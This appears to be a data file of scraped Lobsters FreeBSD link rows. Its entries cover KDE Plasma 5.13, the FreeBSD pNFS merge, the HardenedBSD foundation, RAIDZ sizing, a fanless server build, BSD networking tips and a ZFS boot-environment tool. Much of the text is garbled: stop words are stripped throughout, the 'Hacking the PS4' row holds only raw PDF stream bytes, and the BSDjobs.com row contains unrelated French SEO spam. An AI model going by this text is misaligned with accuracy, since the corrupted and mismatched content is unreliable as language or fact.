bsdcan strongly encourage make time annual event michael dexter senior analyst
368,Lobsters,freebsd,FreeBSD,KDE Plasma 5.13 Released,https://www.kde.org/announcements/plasma-5.13.0.php,kde plasma released,english català galician italiano nederland português русский svenska українська full plasma changelog new plasma plasma browser integration system setting redesigns new look lock login screen graphic compositor discover much gtk global menu integration supporting kde free software supporting kde page join game kde press contact,also available english català galician italiano nederland português русский svenska українська video kde plasma tuesday june today kde unveils final release plasma member plasma team working hard continue making plasma lightweight responsive desktop load run quickly remains fullfeatured polished look feel spent last four month optimising startup minimising memory usage yielding faster timetodesktop better runtime performance le memory consumption basic feature like panel popups optimised make sure run smoothly even lowestend hardware design team rested either producing beautiful new integrated lock login screen graphic browse full plasma changelog find even tweak bug fix featured release full plasma changelog new plasma plasma browser integration plasma browser integration suite new feature make firefox chrome chromiumbased browser work desktop downloads displayed plasma notification popup transferring file dolphin medium control plasmoid mute skip video music playing within browser send link phone kde connect browser tab opened directly using krunner via altspace keyboard shortcut enable plasma browser integration add relevant plugin addon store favourite browser plasma browser integration downloads medium control system setting redesigns setting page redesigned kde visual design group reviewed many tool system setting implementing redesigns kde kirigami framework give page slick new look started theming tool comprising icon desktop theme cursor theme page splash screen page download new splashscreens kde store font page display preview subpixel antialiasing setting redesigned system setting page new look lock login screen login lock screen fresh new design displaying wallpaper current plasma release default lock screen incorporates slick fadetoblur transition show control allowing easily used like screensaver lock login screen new look improved blur effect dash menu graphic compositor compositor kwin gained muchimproved effect blur desktop switching wayland work continued return window rule use high priority egl context initial support screencasts desktop sharing discover list rating themed icon sorting option discover discover software addon installer feature sport improvement look feel using kirigami ui framework improved appearance list category page use toolbars instead big banner image list sorted use new kirigami card widget star rating shown list app page app icon use local icon theme better match desktop setting appstream metadata shown application page including url type work continued bundled app format snap support allows user control app permission possible install snap use classic mode snap url format supported flatpak support gain ability choose preferred repository install one set much change include tech preview gtk global menu integration redesigned medium player widget plasma calendar plugin astronomical event currently showing lunar phase astronomical season equinox solstice xdgdesktopportalkde used give desktop integration flatpak snap application gained support screenshot screencast portal digital clock widget allows copying current date time clipboard notification popup button clear history krunner plugins provide easy access konsole profile character picker mouse system setting page rewritten libinput support x wayland plasma vault new cryfs backend command remotely close open vault kde connect offline vault polished interface better error reporting new dialog pop first plug external monitor easily configure positioned popups panel open faster due new preloading mechanism plasma gained ability fall back software rendering opengl driver unexpectedly fail gedit title bar menu redesigned medium player widget connect external monitor dialog supporting kde kde free software community exists grows help many volunteer donate time effort kde always looking new volunteer contribution whether help coding bug fixing reporting writing documentation translation promotion money etc contribution gratefully appreciated eagerly accepted please read supporting kde page information become kde ev supporting member join game initiative kde kde international technology team creates free open source software desktop portable computing among kde product modern desktop system linux unix platform comprehensive office productivity groupware suite hundred software title many category including internet web application multimedia entertainment educational graphic software development kde software translated language built ease use modern accessibility principle mind kde fullfeatured application run natively linux bsd solaris window macos trademark notice k desktop logo registered trademark kde ev linux registered trademark linus torvalds unix registered trademark open group united state country trademark copyright referred announcement property respective owner press contact information send u email press kdeorg
369,Lobsters,freebsd,FreeBSD,The pNFS server just got merged into FreeBSD.,https://svnweb.freebsd.org/base?view=revision&revision=335012,pnfs server got merged freebsd,http peoplefreebsdorgrmacklempnfsplanbsetuptxt,log message merge pnfs server code projectspnfsplanbserver head code merge add pnfs service server although large commit affect behaviour nonpnfs nfs server documentation work found http peoplefreebsdorgrmacklempnfsplanbsetuptxt hopefully turned proper document soon merge kernel code userland man page change come soon dust settle merge passed make universe hope cause build problem also add server support current stateid brief overview pnfs service pnfs service separate readwrite oeprations metadata operation hoped separation allows pnfs service configured exceeds limit single nfs server either storage capacity andor io bandwidth possible configure mirroring within data server ds data storage file md file mirrored two ds used failure d stop pnfs service failed d recovered repaired pnfs service continues operate although two way mirroring would norm possible set mirroring level four number ds whichever le metadata server always single point failure single nfs server plan b pnfs service consists single metadata server md k data server d recent freebsd system client mount md would single nfs server file created md creates file tree identical single nfs server creates except regular vreg file empty look exported tree md directly md server via nfs mount file size file also two extended attribute system attribute name space pnfsddsfile extended attrbute store information md need find data storage file d file pnfsddsattr extended attribute store size accesstime modifytime change attribute file md nt need acquire attribute d every getattr operation regular vreg file md creates data storage file one mirroring enabled ds one dsnn subdirectory name file file handle file md hexadecimal name unique ds use subdirectory named dsn one directory get large value n set via sysctl vfsnfsddsdirsize md default production server store lot file value probably much larger increased nfsd daemon running md dsk directory created pnfs aware client freebsd server return two piece information client allows io directly d deviceinfo relatively static information defines d critical bit information returned freebsd server ip address d flexible file layout used tightly coupled deviceid identifies deviceinfo layout per file recalled server longer valid freebsd server support two type layout call file flexible file layout allow client io d via io operation flexible file layout recent variant allows specification mirror client expected writes mirror maintain consistent state flexible file layout also allows client report io error d back md flexible file layout support two variant referred tightly coupled v loosely coupled freebsd server always us tightly coupled variant client us credential io d would md loosely coupled variant layout specifies synthetic usergroup client us io d freebsd server striping always return layout entire file critical information layout read v readwritea deviceid identify d data stored time md generates file layout layout client know pnfs nonmirrored d case unless sysctl vfsnfsddefaultflexfile set nonzero case flexible file layout generated mirrored d configuration always generates flexible file layout nfs client support pnfs io operation done md act proxy appropriate d md receives io rpc rpc d proxy d machine mdsds rpc d proxy machine run resource session slot mbufs ds must separate system md tested jamesrose framestorecom relnotes yes
370,Lobsters,freebsd,FreeBSD,June HardenedBSD Foundation Update,https://hardenedbsd.org/article/shawn-webb/2018-06-09/june-hardenedbsd-foundation-update,june hardenedbsd foundation update,,hardenedbsd working towards starting c notforprofit organization usa setting organization allow future donation tax deductible made progress would like share current state affair identified sent invitation received acceptance letter seven people serve hardenedbsd foundation board director find bios latter half june beginning half july meet first time board formally begin process creating documentation needed submit local state federal tax service brief introduction serve board w dean freeman advisor dean ten year professional experience deploying securing unix networking system including assessing system security government certification assessing efficacy security product introduced unix via freebsd isp shell account teenager formerly snort port maintainer freebsd working sourcefire vrt contributed entropyrelated patch freebsd hardenedbsd project topic presented vbsdcon ben la monica advisor ben senior technology manager software engineering morningstar inc developing software year variety language advocate open source software enjoys tinkering electronics home automation george saylor vice president george technical directory inc mr saylor year information system security experience broad range discipline core focus area automation standard event correlation space well penetration exploitoation computer system mr saylor also cofounder openscap project christian severt advisor christian information security engineer served u navy administering classified command control communication computer intelligence system christian also volunteer seattle privacy coalition virginia suydan treasury secretary general administrator accountant general administrator hardenedbsd foundation worked shawn webb tax accounting purpose six year shawn webb president director cofounder hardenedbsd allaround infosec wonk worked played infosec industry offensive defensive research around fifteen year love open source technology like frustrate bad guy ben welch advisor ben currently security engineer inc graduated pennsylvania college technology bachelor information assurance security ben like long walk beach candlelight dinner attending various conference like bsides shmoocon
371,Lobsters,freebsd,FreeBSD,How I Learned to Stop Worrying and Love RAIDZ,https://www.delphix.com/blog/delphix-engineering/zfs-raidz-stripe-width-or-how-i-learned-stop-worrying-and-love-raidz,learned stop worrying love raidz,choose raidz stripe width based iop need amount space willing devote parity information trying optimize raidz stripe width based exact number irrelevant nearly case best performance random iop best reliability best space efficiency performance random iop space efficiency misunderstanding overhead using raidz sector device compressionoff probably want use least disk use least disk use least disk use raidz wide enable compression,popularity openzfs spawned great community user sysadmins architect developer contributing wealth advice tip trick rule thumb configure zfs general great aspect zfs community like take opportunity address one piece misinformed advice many disk put raidz group terminology zpool create tank raidz group vdevs disk let start looking concern play choice group width tl dr choose raidz stripe width based iop need amount space willing devote parity information need iop use fewer disk per stripe need usable space use disk per stripe trying optimize raidz stripe width based exact number irrelevant nearly case best performance random iop use small number disk raidz group eg use total storage parity ideal case using large block raidz spread logical block across device similar contrast even better performance consider using mirroring best reliability use parity eg instead architect group match storage hardware eg shelf disk could use group disk one shelf tolerate whole shelf dying whole shelf dying plus disk dying space used parity information best space efficiency use large number disk raidz group wider stripe never hurt space efficiency certain exceptional case use least disk respectively see detail trading concern useful know much help vary parameter performance random iop raidz group approximately performance single disk group double write iop would need halve number disk raidz group double read iop would need halve number data disk raidz group eg go disk note streaming read performance independent raidz configuration data read streaming write performance proportional space efficiency space efficiency typically doubling number data disk halve amount parity per mb data eg going disk reduce amount parity information raidz block layout caption raidz parity information associated block rather specific stripe take example block use one sector parity plus sector data eg yellow block left row block use parity data parity data parity data eg blue block left row note several block sharing would traditionally thought single stripe multiple parity block stripe raidz also requires allocation multiple freed leave free segment small used ie small fit even single sector data plus p parity sector eg light blue block left row parity data padding therefore raidz requires bit space parity overhead misunderstanding overhead caused people recommend using p disk p number parity disk ie n integer people would claim example better generally true primary flaw recommendation assumes using small block whose size power workload eg database use logical block size ie workload benefit greatly compression delphix store oracle m sql server postgresql database compression typically see compression ratio compression beneficial raidz sizing due compression physical allocated block size power two odd size like mean rely exact fit compressed block size raidz group width help understand generally incorrect recommendation come hypothetical benefit would use compressionoff various raidz group width created spreadsheet show much space used paritypadding given various block size raidz group width see case setting small recordsize sector disk using compression using disk us substantially le space one le disk however disk raidz group never worse space efficiency space used parity information varying number disk block size click full google doc spreadsheet includes space used parity information varying number disk block size click full google doc spreadsheet includes note setting small recordsize sector device result universally poor space efficiency raidzp better pway mirror strongest valid recommendation based exact fitting block stripe following using raidz sector device compressionoff probably want use least disk use least disk use least disk summarize use raidz wide enable compression reading raidz
373,Lobsters,freebsd,FreeBSD,Silent Fanless FreeBSD Desktop/Server,https://vermaden.wordpress.com/2018/06/07/silent-fanless-freebsd-desktop-server/,silent fanless freebsd desktopserver,biostar amd arkintelcom intel component total aliexpresscom ebaycom silverstone intertech total wan na go pro supermicro silverstone usb drive gb adata usb drive sandisk cruzer fit gb cost freenas mini diskless freebsd freebsd dmesg dmesg storage intertech barracuda expansion system omniosce freenas zfsguru nappit freebsd desktop part install hardenedbsd update motherboard ecc ram support bill bog asrock intel atom samsung ecc reg x total freenas mini diskless sandisk cruzer fit gb update silent fanless freebsd desktopserver bsd silence fan update http silentpccom silent fanless freebsd desktopserver bsd silence fan http bsd openbsd surfacing like,today write silent fanless freebsd desktop server computer na name multiple purpose also low power solution also mean overheat silent mean fan even psu format system also brought minimum miniitx seems best solution also made two follow ups article chosen intel based solution low power prefer amd often closest solution comparable price power biostar motherboard amd cpu power course amd even low power soc solution finding miniitx motherboard decent price easy task comparision intel lot solution whose nicely filtered arkintelcom page pity amd provide filtration product also chosen aes instruction storage encryption geli freebsd today seems obvious http web page system look powered working motherboard us intel soc us aes instruction two core disposal also support vtx ept extension even run bhyve component example system would look like one component price cpumotherboard asrock miniitx ram crucial gb low power psu pico internal psu fsp external usb drive gb adata usb wireless total psu pico internal psu fsp purchased aliexpresscom ebaycom example least got pico internal psu optional additional cable power optional hdds course one sata power one molex power additional molexsata power adapter would needed fsp external psu without power cord still without case currently silverstone today would probably buy something else cost cheaper solution similar feature would like use two drive even low power noise zfs mirror intertech case seems far better also come silent psu silverstone case loud psu intertech case silent psu intertech case component price would look like cpumotherboard asrock miniitx ram crucial gb low power case intertech come psu usb drive gb adata usb wireless total course wan na go pro great case supermicro also used freenas mini appliance silverstone disk loaded top cost without psu supermicro case silverstone case ram vendor important important get low power memory take le power boring ram stick used usb drive gb adata system drive going buy one would get usb drive sandisk cruzer fit gb barely get port even two zfs mirror system critical sandisk cruzer fit flash also used tiny usb wifi stick size sandisk cruzer fit cost give total silent fanless system price one tenth cost cheapest freenas hardware solution available freenas mini diskless cost also without disk freebsd tried freebsd box upcoming freebsd currently stage would much well dmesg console output system boot machine copyright c freebsd project copyright c regent university california right reserved freebsd registered trademark freebsd foundation freebsd thu mar utc root freebsd clang version based llvm warning witness option enabled expect reduced performance vt efifb resolution cpu intel r celeron r cpu cpu origin genuineintel amd amd structured extended xsave vtx pat hlt mtf pause ept ug vpid vid postintr tsc pstate invariant performance statistic real memory mb avail memory mb event timer lapic quality acpi apic table warning data cache cover fewer apic id core freebsdsmp multiprocessor system detected cpu freebsdsmp package x core random unblocking device irqs motherboard smp ap cpu launched timecounter tsc frequency hz quality random entropy device external interface netmap loaded module athhal loaded moduleregisterinit modload vesa error random registering fast source intel secure key rng random fast provider intel secure key rng motherboard motherboard unknown io range supported port irq timecounter frequency hz quality event timer frequency hz quality port warning could nt map io registered timeofday clock resolution event timer rtc frequency hz quality iomem irq timecounter hpet frequency hz quality event timer hpet frequency hz quality event timer frequency hz quality event timer frequency hz quality event timer frequency hz quality event timer frequency hz quality event timer frequency hz quality event timer frequency hz quality timecounter acpifast frequency hz quality port port port mem irq device boot video device mem irq device device driver attached port mem irq device ahci port port multiplier supported channel channel irq device irq device port mem irq device using msix message aspm disabled chip rev mac rev phy none auto autoflow using default tso ethernet address xx xx xx netmap queuesslots tx rx mem irq device byte context size dma super speed usb device port irq drq smclike chipset compatible mode fifo byte threshold interruptdriven port port irq flag port irq port irq giantlocked nonpnp isa device removed generic freebsd zfs filesystem version zfs storage pool version feature support timecounters tick every msec cad nid nid nid nid cad nid nid trying mount root zfs zrootrootdefault root mount waiting warning witness option enabled expect reduced performance port removable self powered root mount waiting root mount waiting scsi bulkonly quirk attached bus target lun removable direct access scsi device serial number transfer byte sector root mount waiting root mount waiting root mount waiting root mount waiting port removable bus powered link state changed macbb rf tried hdmi output vga output console worked properly sound onboard nic rest provided interface connect internet fetch package used tiny usb wifi stick based chip also worked good detail console usb wifi stick dmesg macbb rf storage gon na serve na storage attach depends much storage space need fit tb quite lot anyway still use intertech case seagate provides tb drive barracuda model currently use two tb drive cheaper drive course requires bigger case power also make noise keep system totally silent would course use ssd drive storage would expensive example getting two tb ssd drive mirror would cost price could get two tb hdd drive one fifth cost comparing ssd drive two tb hdd drive one eighth cost comparing ssd drive see total silence come price expansion motherboard come pciexpress slot expand feature even example ge card additional sata controller used older solution used slot usb port card extension kind motherboards often come internal mini pciexpress port ideal wireless device ssd drive system put plain freebsd top solarisillumos distribution omniosce server oriented use prebuilt na solution based freebsd like freenas zfsguru even solarisillumos based storage nappit appliance course stick one ssd usb flash system use desktop install like freebsd desktop part install article case would suggest getting even smaller case one described wifi card support host ap mode atheros device also turn safe wireless access point hardenedbsd system even openbsd update motherboard ecc ram support bill bog mentioned comment kind setup offer ecc memory agree better ecc add update information achieve still cheap silent fanless setup asrock come help ecc memory support expensive get new come quadcore intel atom cpu us power bad considering support gb ecc ram sata port also cover important feature aes instruction vtx ept extension bhyve support still provides pciexpress slot even remote management ipmi last least two ge lan port look ecc ram usually expensive regular one used ecc ram stick needed setup cheap without extra effort able find used samsung ecc reg memory stick le boring ecc ram stick example complete ecc setup would look like cpumotherboard asrock ram samsung gb ecc reg case intertech come psu x sandisk cruzer fit gb usb wireless total still quarter cost comparing freenas mini diskless appliance two sandisk cruzer fit gb drive put system zfs mirror already use ecc memory increased data security update silent fanless freebsd desktopserver article featured bsd silence fan episode thanks mentioning update seems indirectly created discount http silentpccom machine silent fanless freebsd desktopserver featured bsd silence fan peter silentpc wrote http also see talked latest bsd openbsd surfacing episode mention bsd comment checkout get discount system eof like like loading related
374,Lobsters,freebsd,FreeBSD,TrueOS to Become Core Operating System,https://www.trueos.org/blog/trueosdownstream/,trueos become core operating system,open letter trueos community trueos discontinuation truenas core,open letter trueos community trueos discontinuation hey trueos community wanted take minute address may already guessed heavy heart trueos core team decided discontinue development trueos foreseeable future still heavily involved open source project like freenas truenas core incredibly proud work put trueos predecessor pcbsd trueos source code remain available github others may want continue work started many year ago explain much appreciate loyal fan trueos pcbsd past confident even though hard decision also correct decision exciting new project becoming involved like truenas core question hesitate ask many thanks best wish joshua kris
375,Lobsters,freebsd,FreeBSD,BSD: Networking Included,http://eradman.com/posts/networking-included.html,bsd networking included,bsd networking included bsd kernel track duplicate ip run daemon foreground process resolve common port quickly find proxyarp finding gateway log traffic two device doublecheck subnet mask check file integrity http teisprintnettestzip http teisprintnettestzip http routing loop tftp standard log everything tmux domain internet groper find manufacturer device searching wireless network aka serial device print configuration bsd telnet work xterm ansi terminal vga font http scientistdistsabvgapcf http scientistdistvgapcf http garry dolley custom keymappings,bsd networking included everyday technique use get stuff done bsd kernel track duplicate ip bsd kernel keep track macip resolution log change good habit check plugging laptop network plugged thinkpad network broken service dhcp server gave address already used dmesg duplicate ip address sent ethernet address duplicate ip address sent ethernet address duplicate ip address sent ethernet address duplicate ip address sent ethernet address run daemon foreground process bsd network daemon run foreground give ability easily test service may notice oddity immediately example site configured two competing dhcp server doas dhclient dhcprequest port dhcpnak dhcpdiscover port interval dhcpoffer dhcpoffer dhcprequest port dhcpack bound renewal second resolve common port etcservices handy reference common protocol grep etcservices netbiosdgm netbios datagram service netbiosdgm also sometimes document assignment defining etcservices know port used especially proprietary system coral coral pbx management cugw quickly find proxyarp insane sometimes homeoffice router installed proxyarp enabled default linksys vpn router come mind quick look arp table show arp finding gateway arp request come gateway given subnet volume request make easy find gateway doas tcpdump n arp tcpdump listening linktype arp whohas tell arp whohas tell arp whohas tell arp whohas tell arp whohas tell log traffic two device ca nt get hub inbetween two point switch support port mirroring second nic laptop set bridge two point full network trace captured builtin network card xircom combo pccard slot ifconfig ifconfig ifconfig brconfig add brconfig add doas brconfig running priority hellotime fwddelay maxage holdcnt proto rstp learning discover port ifpriority ifcost learning discover port ifpriority ifcost address max cache timeout log everything snort doas snort l tcpdump doas tcpdump w file tcpdump listening linktype c packet received filter packet dropped kernel doas tcpdump r file icmp capture file comparison possible different sample time maybe even match flow specific event learn others doublecheck subnet mask even setting network hard make mistake calculating subnets ip calculator handy way check installed port netipcalc ipcalc address netmask network broadcast host min host max hostsnet check file integrity router corrupt data stream rare transferring file demonstrated cisco corrupt payload tcp packet armed may catch tricky glitch hardware software testzip testzip ftp http teisprintnettestzip trying requesting http teisprintnettestzip via http kb successfully retrieved file testzip testzip simply comparing file size good method testing validity trasmission routing loop finding routing loop advanced topic require specialized set tool thanks tcpdump check anywhere watching ttl value switching loop duplicate packet routing loop ttl moving lan doas tcpdump port ip tos ttl id offset flag df proto tcp length p cksum correct ack win ip tos ttl id offset flag df proto tcp length p cksum correct ack win ip tos ttl id offset flag df proto tcp length p cksum correct ack win many time caused server ip forwarding enabled test suspect trying route packet suspect doas route delete default doas route add default ping eradmancom tftp standard good habit copying configuration rotuers switch modify backup etcinetdconf tftp dgram udp wait root usrlibexectftpd tftpd tftpboot tftp dgram wait root usrlibexectftpd tftpd tftpboot link tftp folder tftpboot home directory important thing thatinetdhave write permission file want copy l l tftpboot lrwxrxrx root wheel dec tftpboot homeeradmantftp touch chmod log everything tmux tmux nt provide builtin shortcut logging output session easily toggled adding shortcut tmuxconf bindkey h pipepane quot exec cat home wtmuxlog quot displaymessage started logging home wtmuxlog bindkey h pipepane displaymessage ended logging home wtmuxlog domain internet groper host give need know host eradmancom eradmancom address eradmancom address eradmancom mail handled dig provides flexible interface searching dns dig nycbugorg n short use x look reverse lookup find manufacturer device first get first six octet manufacturer particular nic know address offending device may able tell kind device arp sed g static grep documentsouitxt hex corporation nmap automatically searching wireless network openbsd ifconfig completely unifies configuration various network card including wireless adaptor scan ssids visible laptop use scan parameter doas ifconfig scan broadcast running simplex multicast mtu lladdr priority group wlan egress medium autoselect mode status active nwid chan bssid nwid chan bssid nwid guest chan bssid nwid avctrl chan bssid inet netmask broadcast aka serial device serial access also builtin cu l break usbtoserial converter access like dmesg port configuration quot research motion rim composite device quot rev addr port quot prolific technology inc usbserial controller quot rev addr print configuration courier waste lot paper need print text install port use half much apconf apconfps bsd telnet work may wellkept secret bsd telnet send one character time sometimes required simulate serial link terminal need password prompt etc telnet trying connected escape character enter password telnet mode character better yet add common connection parameter telnetrc simplicity vm mode character donothing make line work set crmod xterm ansi terminal vga font cd doas ftp http scientistdistsabvgapcf doas ftp http scientistdistvgapcf doas ftp http doas mkfontdir thanks garry dolley posting font showing o x well xterm sb fn vga bg darkblue fg white view text console custom keymappings proprietary application often expect goofy character combination normal use key translation xterm flexible map key pair string character used vim figure key moving cursor character code like typing ga show hex code status line part xdefaults xterm override n shift key string string string n shift key string string string n shift key string string string n shift key string string string n shift key string string string n shift key string string string n shift key string string string n shift key string string string n shift key string string string n shift key string string string n key enabled manage old tadiran voicemail via network serial port
376,Lobsters,freebsd,FreeBSD,zedenv ZFS Boot Environment Manager,https://ramsdenj.com/2018/05/29/zedenv-zfs-boot-environment-manager.html,zedenv zfs boot environment manager,alpha release zedenv beadm available boot environment next section create boot environment information zedenv documentation github post available,finished first alpha release zedenv zfs boot environment manager freebsd linux created project enjoyed use boot environment manager using freebsd server missed access one linux zedenv work similarly freebsd beadm turn based solaris beadm zedenv written completely python open source licensed license anyone would like contribute code available github boot environment skip ahead creating boot environment see next section first anyone familiar idea boot environment manager boot environment basically way snapshot system change system made without fear bringing system unusable state new idea used solaris freebsd extent linux however amount used prior two system boot environment reliant specific file system rely file system support clone zfs using boot environment able multiple version system going simultaneously beauty end using roughly amount data single system zfs let create multiple filesystems known datasets boot environment take advantage low cost clone taken current root dataset clone effectively forking point prior data shared origin dataset clone new data stored separately creating boot environment ready used activated activation system rebooted new data stored new boot environment allows workflow whenever something dangerous done environment created boot environment integrated bootloader time one selected right boot menu almost separate installs operating system create boot environment let consider situation large change going made system upgrade current root file system zfs dataset vaultrootdefault single boot environment default zedenv list name active mountpoint creation default nr see active n r active column represent using boot environment used reboot keep current working system present state let create activate new boot environment called zedenv create take look zfs datasets point new clone taking almost used space zfs list r vaultroot name used avail refer mountpoint vaultroot none vaultrootdefault listing boot environment see new name active mountpoint creation default nr let activate new boot environment zedenv activate listing show reboot new boot environment would active name active mountpoint creation default n r reboot see root file system newlycreated boot environment name active mountpoint creation default nr large upgrade system hosed select original boot environment bootloader back original working system chosen default boot menu activate want continue using zedenv activate default want inspect broken boot environment even mount zedenv mount verbose mounting boot environment mountpoint given using temporary directory mounted dataset take look l total drwxrxrx root root mar drwxrwxrwt root root may lrwxrwxrwx root root jan bin usrbin drwxrxrx root root aug boot drwxrxrx root root aug dev drwxrxrx root root may etc drwxrxrx root root aug home lrwxrwxrwx root root jan lib usrlib lrwxrwxrwx root root jan usrlib drwxrxrx root root may mnt drxrxrx root root sep net drwxrxrx root root apr opt drxrxrx root root aug proc drwxrx root root may root drwxrxrx root root aug run lrwxrwxrwx root root jan sbin usrbin drwxrxrx root root dec srv drxrxrx root root aug sys drwxrwxrwt root root aug tmp drwxrxrx root root may usr drwxrxrx root root may var done destroy zedenv destroy v information simple look boot environment used information found zedenv documentation github also written post past regarding using zfs arch linux go detail dataset setup installation anyone would like contribute code available github
377,Lobsters,freebsd,FreeBSD,Hacking the PS4: From zero to ring zero in two easy steps,http://crack.bargains/02r0.pdf,hacking zero ring zero two easy step,xkcmd x,obj length r filter flatedecode stream endstream endobj obj endobj obj type page parent r resource r content r mediabox endobj obj procset pdf text colorspace r font r endobj obj length r n alternate devicergb filter flatedecode stream vdf c n z v l r dgry j e e n c ёl q wt w endstream endobj obj endobj obj iccbased r endobj obj length r filter flatedecode stream qq endstream endobj obj endobj obj type page parent r resource r content r mediabox endobj obj procset pdf text colorspace r font r endobj obj length r filter flatedecode stream q n endstream endobj obj endobj obj type page parent r resource r content r mediabox endobj obj procset pdf text colorspace r font r endobj obj length r filter flatedecode stream e bk oc yz endstream endobj obj endobj obj type page parent r resource r content r mediabox endobj obj procset pdf text colorspace r font r endobj obj length r filter flatedecode stream xkcmd x endstream endobj obj endobj obj type page parent r resource r content r mediabox endobj obj procset pdf text colorspace r font r endobj obj length r filter flatedecode stream r endstream endobj obj endobj obj type page parent r resource r content r mediabox endobj obj procset pdf text colorspace r font r endobj obj length r filter flatedecode stream џ endstream endobj obj endobj obj type page parent r resource r content r mediabox endobj obj procset pdf text colorspace r font r endobj obj length r filter flatedecode stream b ѷ ò endstream endobj obj endobj obj type page parent r resource r content r mediabox endobj obj procset pdf text colorspace r font r endobj obj length r filter flatedecode stream q q endstream endobj obj endobj obj type page parent r resource r content r mediabox endobj obj procset pdf text colorspace r font r endobj obj length r filter flatedecode stream endstream endobj obj endobj obj type page parent r resource r content r mediabox endobj obj procset pdf text colorspace r font r endobj obj length r filter flatedecode stream endstream endobj obj endobj obj type page parent r resource r content r mediabox endobj obj procset pdf text colorspace r font r endobj obj length r filter flatedecode stream yx b endstream endobj obj endobj obj type page parent r resource r content r mediabox endobj obj procset pdf text colorspace r font r endobj obj length r filter flatedecode stream h endstream endobj obj endobj obj type page parent r resource r content r mediabox endobj obj procset pdf text colorspace r font r endobj obj length r filter flatedecode stream endstream endobj obj endobj obj type page parent r resource r content r mediabox endobj obj procset pdf text colorspace r font r endobj obj length r filter flatedecode stream ee k xw x endstream endobj obj endobj obj type page parent r resource r content r mediabox endobj obj procset pdf text imageb imagec imagei colorspace r font r xobject r endobj obj length r type xobject subtype image width height interpolate true colorspace r intent perceptual smask r bitspercomponent filter flatedecode stream lm ˣ n η h cfg p lgz r ko l mw j h c ɛ r ǰ ah r gek j p hc u q gy w z n e dz l r za f afg jeg
378,Lobsters,freebsd,FreeBSD,Launching BSDjobs.com,https://www.bsdjobs.com/,launching bsdjobscom,,comprendre plusieurs langues est aujourd hui indispensable non seulement pour une bonne ouverture esprit mais aussi pour insérer facilement sur le plan professionnel il est vrai que beaucoup de programme scolaires intègrent l apprentissage une ou plusieurs langues étrangères seule la discipline personnelle et la volonté permettent atteindre effectivement l objectif du multilinguisme envie apprendre une nouvelle langue il existe un programme qui empêche le publicités apparaître sur vos diver site web c est bien adblock il filtre le données personnelles de utilisateurs en effet il bloque le différents portails ouverts ce qui provoque la non réception de diver annonces se rend clairement compte qu il n apporte aucun avantage à l utilisateur comment faire alors le marketing affiliation est une façon très simple de faire du profit effectivement il suffira de vendre par le biais une plateforme web le produits une entreprise toutefois pour avoir du succès dans ce domaine vous devrez sacrifier du temp et investir de l argent comprendre le principe fondamentaux si vous ne savez pa ce que cuire du poisson au four en l assaisonnant avec de tomates du citron ou de l huile olive permet de ressortir chaque saveur et arome qui réside dans le poisson vous ne savez pa comment vous prendre pour la cuisson de votre poisson au four voici donc quelques conseils qui vous permettront de vous en il est très facile de louper s vacances si n pa un planning logique et bien détaillé en tête pour cela découvrez dans cet article conseils infaillibles pour avoir de vacances inoubliables choisir avance votre destination c est un moyen infaillible de participer activement à la réussite de vos vacances ainsi vous êtes sûr le commerce en ligne est un business qui rapporte pa mal argent grâce à de petits investissements mais pour avoir beaucoup de revenus certaines disposition sont à prendre pour savoir quelle stratégie utiliser pour augmenter votre chiffre affaire à travers le commerce en ligne lisez le présent article qui vous propose quelques astuces travaillez votre le saviezvous savoir gérer un conflit entre collaborateurs lorsqu est manager une entreprise c est important le conflit est une situation qui peut affecter le fonctionnement et le activités une entreprise le situation conflictuelles qui persistent peuvent devenir avec le temp une source de démobilisation importante cela pourrait être difficile à surmonter si aucune action parler aujourdhui de la mode sans se référer aux magazine féminins est insignifiant puisque la beauté féminine enflamme plus de nombreux internautes sur le réseaux sociaux cest lexemple de monica bellucci une actrice très célèbre en matière de mode alors quels sont le atouts de monica bellucci dans la mode fait le point il arrive très souvent pendant le printemps par exemple que de abeilles domestiques quittent leur ruche pour former un essaim dans un lieu où il se sentent en sécurité et à laise il peut sagir dune poutre dune branche darbre ou dun quelconque endroit tranquille au sein de votre jardin évidemment tout le monde ne basé aux étatsunis et plus précisément à chicago activecampaign est un fournisseur de logiciel de marketing et dautomatisation de ventes quon ne présente plus faisons une immersion dans lunivers de cette société en nous intéressant à s atouts marketing lautomatisation latout premier lun de terrain sur lesquels activecampaign se distingue cest bien celui de face à l incendie ou à un nombre croissant de cambriolages il est impératif de sécuriser sa maison par le solution coûteuses il existe plusieurs autres se caractérisant par leur facilité de mise en place la sécurité de porte pour introduire dans une maison le cambrioleurs passent généralement par la porte entrée pour conséquent vous la laine pashmina encore connue sou le nom simple de pashmina est une laine très fine qui est créée à partir du sousduvet de la toison de chèvres ce produit qui est un coussin du cachemire un diamètre très faible cette laine connue aussi sou le nom de de fibre est utilisée dans vous n êtes pa sans savoir que décrocher un emploi n est pa une mince affaire chacun fait ce qu il peut pour tirer son épingle du jeu si vous êtes dans la recherche dans un emploi cet article vous est destiné afin augmenter vos chance de décrocher un emploi envoyez beaucoup de candidature spontanées il vous plaît le saviezvous séjourner dans un appartement trop humide peut avoir un impact négatif sur votre santé l humidité peut engendrer un inconfort et rendre la vie pénible dans votre logement que vous ayez de enfants ou de personnes à charge l humidité peut avoir de effets négatifs sur leur santé vivre dans un appartement trop humide vous rêvez de quitter la location et avoir votre propre appartement c est bien possible et il ne agit pa uniquement un appartement quelconque l appartement dont vous rêvez nous vous donnons le astuces pour l avoir le étapes de recherche de votre appartement lorsque vous cherchez l appart de vos rêves vous ne devez pa être pressé cest parfois fatiguant daller dans un casino pour vous faire un peu de sou aujourdhui vous naurez plus ce mal il existe de casino en ligne canada très légales pour vous faire de sou rien quen etant assis confortablement chez vous notez quil sagit de casino exclusivement canadien du casino traditionnel canadien au casino en derrière la structure physique de toute entreprise se cache un ensemble de mécanismes destinés à régler différents aspect pour son fonctionnement optimal dans cette organisation immatérielle la gestion de la paie occupe une place particulièrement sensible lisez no conseils pour une bonne gestion de la paie dans votre entreprise utilisez un logiciel approprié et associez après un parcours académique excellent avec l obtention de diplômes vous rêvez un bon emploi bien rémunéré vous avez la ferme intention de trouver le plus rapidement possible l emploi de vos rêves et vous n êtes pa du genre à attendre que l emploi tombe du ciel mais avec le marché de l emploi saturé vous ne savez pa chaque année de milliers de personnes ou de familles voyagent de part et dautres au bout du monde elles sont dans la plupart du temp à la recherche dun endroit qui leur permettra de se détendre et de prendre de nouvelles force seychelles un pay pour le tourisme le seychelles sont un ensemble incroyable de voilà que votre parcelle est pleine construction et là j imagine que ce serait une maison à étage ou bien une simple concession dans ce ca la mise en place de escaliers avère indispensable alors à quelle forme escalier vous vous pensez la réponse à cette question vous serum détaillée dans cet article que nous le jean est un vêtement qui est imposé à plusieurs sociétés au fil de années au point être parmi le vêtements le 